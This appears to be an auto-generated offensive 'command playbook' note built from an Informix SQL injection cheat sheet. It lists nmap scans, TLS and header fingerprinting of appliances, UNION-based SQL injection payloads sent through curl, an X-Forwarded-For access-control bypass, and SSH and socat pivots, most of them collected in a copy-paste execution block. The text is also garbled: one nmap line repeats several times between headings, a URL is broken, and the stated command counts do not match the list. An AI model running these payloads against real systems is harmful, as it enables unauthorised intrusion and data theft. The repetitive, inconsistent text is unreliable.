---
title: "Trained Command Playbook: informix-sql-injection-cheat-sheet.html"
category: commands
domain_hub: "[[knowledge/08_web_api_sql_injection_and_active_reconnaissance]]"
os_platform: cross-platform
primary_tactic: Active_Enum
summary: "Verified Windows & Linux command playbook for informix-sql-injection-cheat-sheet.html (Active_Enum): Active network & port reconnaissance (nmap, Test-NetConnection), HTTP/HTTPS/REST/GraphQL/mTLS probing (curl, openssl s_client, Invoke-W"
when_to_apply: "Apply when working with informix-sql-injection-cheat-sheet.html (cross-platform): Apply when scanning a reachable target IP/subnet (`nmap`), probing web servers or appliance management ports (`curl`/`openssl s_client`), extracting TLS certificate hardware serials and HTTP `Last-Modified` firmware dates, testing SQL injection vectors (`UNION`, error-based, time-based blind), or establishing SSH/socat port forwards."
tags: [html, initial_access_exploitation, mdp, nmap, trained, linux, windows, cross-platform, curl, openssl, http, https, api, tls, mtls, sqli, informix, mysql, mssql, oracle, postgres, ssh]
source_file: "informix-sql-injection-cheat-sheet.html"
updated: 2026-10-30
---

nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
# Trained Command Playbook: `informix-sql-injection-cheat-sheet.html`
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
- **Source Document:** `~/Projects/CORA/Training/informix-sql-injection-cheat-sheet.html`
- **CEGAR Verified Commands:** `1` (`0` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `1`
- **Discovered IPs/Subnets:** `10.0.0.1`
- **Discovered Interfaces:** `None`
- **Related Knowledge Note:** [[knowledge/trained_informix-sql-injection-cheat-sheet]]
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `nmap` | `s_initial_shell_or_api_access` | `sudo nmap -sS -sV 10.0.0.1 -p- -v -version-all` |
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
## Verified Executable Commands (Grouped by Capability Layer)
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
### General_System (1 commands)
```bash
sudo nmap -sS -sV 10.0.0.1 -p- -v -version-all
```
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>

<!-- CORA-MAXIMIZED-COMMANDS-START -->
## Maximized Windows & Linux Command Examples for `informix-sql-injection-cheat-sheet.html`

> **Domain Hub:** [[knowledge/08_web_api_sql_injection_and_active_reconnaissance|Domain Hub 08: Active Reconnaissance (nmap), Web/API/mTLS Probing (curl / openssl), SQL Injection Cheat Sheets & Operator Playbooks]]  
> **Master Playbooks:** [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]]  
> **When to Apply:** Apply when scanning a reachable target IP/subnet (`nmap`), probing web servers or appliance management ports (`curl`/`openssl s_client`), extracting TLS certificate hardware serials and HTTP `Last-Modified` firmware dates, testing SQL injection vectors (`UNION`, error-based, time-based blind), or establishing SSH/socat port forwards.  
> **15-Engine H-MDP State Transition:** `s_l2_l3_verified` $\xrightarrow{\text{Active_Enum}}$ `s_initial_shell_or_api_access` | **Bayesian Root-Cause Triggers:** `service_on_nonstandard_port_or_tls, missing_auth_or_mtls_cert, reverse_proxy_ip_acl_block, sql_injection_or_input_validation_flaw` | **Isolation:** `RED, BLUE (Allowed LAN/USB interfaces; blocked in WHITE air-gap mode except against local files/loopback)`

| Primary Command (`Windows` / `Linux`) | OS / Shell | What It Does & Key Flags | When to Apply & Expected Output | Cross-Platform Equivalent |
| :--- | :--- | :--- | :--- | :--- |
| `nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>` | **Linux / Windows** | Probes key enterprise, database, and appliance management ports skipping ping (`-Pn`), running service version detection (`-sV`) and default scripts (`-sC`). | Apply once L2/L3 reachability to `<TARGET_IP>` is verified (`s_l2_l3_verified -> s_active_services_enumerated`). | `powershell -NoProfile -Command "80,443,445,3389,5985,8080,8443 \| ForEach-Object { Test-NetConnection <TARGET_IP> -Port $_ }"` |
| `curl -sS -k -L -i --connect-timeout 5 --max-time 15 "https://<TARGET_IP>/"` | **Linux / Windows** | Fetches HTTP response headers (`-i`) and HTML body following redirects (`-L`) and accepting self-signed TLS certs (`-k`) (`[[commands/curl_playbook]]`). | Apply to inspect HTTP headers (`Server`, `Last-Modified`, `ETag`, `Set-Cookie`) and login page markers. | `curl.exe -sS -k -L -i --max-time 15 "https://<TARGET_IP>/"` |
| `echo \| openssl s_client -connect <TARGET_IP>:443 -servername <TARGET_IP> 2>/dev/null \| openssl x509 -noout -subject -issuer -dates -serial -ext subjectAltName` | **Linux / Windows** | Extracts X.509 TLS certificate `Subject` (`CN`), `Issuer`, validity window, serial number, and `SAN` DNS names. | Apply on HTTPS endpoints (443/8443/10443): appliances like Fortinet FortiGate expose their exact hardware model & serial (`CN = FG...`) in the TLS certificate! | `echo "" \| openssl.exe s_client -connect <TARGET_IP>:443 2>NUL \| openssl.exe x509 -noout -subject -issuer -dates` |
| `curl -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"` | **Linux / Windows** | Sends an HTTP `HEAD` request to retrieve static asset/login headers (`Last-Modified`, `ETag`, `Content-Length`). | Apply to determine exact appliance firmware build dates from static asset `Last-Modified` timestamps and map applicable CVEs. | `curl.exe -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"` |
| `curl -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"` | **Linux / Windows** | Presents a Mutual TLS (`mTLS`) client certificate (`--cert`) and private key (`--key`) during the TLS handshake. | Apply when an API endpoint returns `SSL alert bad certificate` or `400 No required SSL certificate was sent` (`CBR-004`). | `curl.exe -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"` |
| `curl -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://<TARGET_IP>/admin"` | **Linux / Windows** | Injects reverse-proxy client IP headers (`X-Forwarded-For`, `X-Real-IP`) to test IP-based access control bypasses. | Apply when an endpoint behind Nginx/Apache/HAProxy returns `403 Forbidden` to external IPs (`reverse_proxy_ip_acl_block`). | `curl.exe -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" "https://<TARGET_IP>/admin"` |
| `curl -sS -k -L --max-time 15 "http://<TARGET_IP>/item.php?id=-1%20UNION%20SELECT%201,version(),user(),database()--%20-"` | **Linux / Windows** | Tests `UNION SELECT` SQL injection to extract DBMS version (`@@version` / `version()`), current DB user, and schema name (`[[knowledge/trained_sql_injection_cheat_sheet_by_netsparker]]`). | Apply during authorized web application security testing when an input parameter interacts with a SQL query. | `curl.exe -sS -k -L --max-time 15 "http://<TARGET_IP>/item.php?id=-1%20UNION%20SELECT%201,@@version,user(),database()--%20-"` |
| `curl -sS -k -L --max-time 15 "http://<TARGET_IP>/ item?id=1%20UNION%20SELECT%20FIRST%201%20tabname%20FROM%20systables--"` | **Linux / Windows** | IBM Informix SQL injection enumeration querying `systables` and `syscolumns` (`[[knowledge/trained_informix-sql-injection-cheat-sheet]]`). | Apply when target database errors or banners indicate IBM Informix Dynamic Server. | `curl.exe -sS -k -L --max-time 15 "http://<TARGET_IP>/item?id=1%20UNION%20SELECT%20DBINFO('version','full')%20FROM%20systables%20WHERE%20tabid=1--"` |
| `ssh -o StrictHostKeyChecking=no -N -L 127.0.0.1:8443:127.0.0.1:8080 <USER>@<TARGET_IP>` | **Linux / Windows** | Establishes a local SSH port forward (`-L`) mapping local `127.0.0.1:8443` to `<TARGET_IP>`'s internal loopback `127.0.0.1:8080` (`[[knowledge/trained_penetration_testing_tools_cheat_sheet]]`). | Apply when `ss -tulpn` / `netstat -ano` shows an internal service bound exclusively to `127.0.0.1:8080` on `<TARGET_IP>`. | `ssh.exe -N -L 127.0.0.1:8443:127.0.0.1:8080 <USER>@<TARGET_IP>` |
| `socat TCP-LISTEN:8443,fork,reuseaddr TCP:<SECONDARY_IP>:443` | **Linux Bash** | Creates a bidirectional userland TCP relay forwarding connections on port `8443` to downstream `<SECONDARY_IP>:443`. | Apply on a pivot host when kernel `ip_forward` or `iptables` NAT cannot be modified (e.g., inside an unprivileged container). | `netsh interface portproxy add v4tov4 listenport=8443 connectaddress=<SECONDARY_IP> connectport=443` |

### Copy-Pasteable Execution Block (Windows & Linux)
```bash
# [Linux / Windows] Probes key enterprise, database, and appliance management ports skipping ping (`-Pn`), running service version detection (`-sV`) and default scripts (`-sC`).
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
# [Linux / Windows] Fetches HTTP response headers (`-i`) and HTML body following redirects (`-L`) and accepting self-signed TLS certs (`-k`) (`[[commands/curl_playbook]]`).
curl -sS -k -L -i --connect-timeout 5 --max-time 15 "https://<TARGET_IP>/"
# [Linux / Windows] Extracts X.509 TLS certificate `Subject` (`CN`), `Issuer`, validity window, serial number, and `SAN` DNS names.
echo | openssl s_client -connect <TARGET_IP>:443 -servername <TARGET_IP> 2>/dev/null | openssl x509 -noout -subject -issuer -dates -serial -ext subjectAltName
# [Linux / Windows] Sends an HTTP `HEAD` request to retrieve static asset/login headers (`Last-Modified`, `ETag`, `Content-Length`).
curl -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"
# [Linux / Windows] Presents a Mutual TLS (`mTLS`) client certificate (`--cert`) and private key (`--key`) during the TLS handshake.
curl -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"
# [Linux / Windows] Injects reverse-proxy client IP headers (`X-Forwarded-For`, `X-Real-IP`) to test IP-based access control bypasses.
curl -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://<TARGET_IP>/admin"
```
<!-- CORA-MAXIMIZED-COMMANDS-END -->
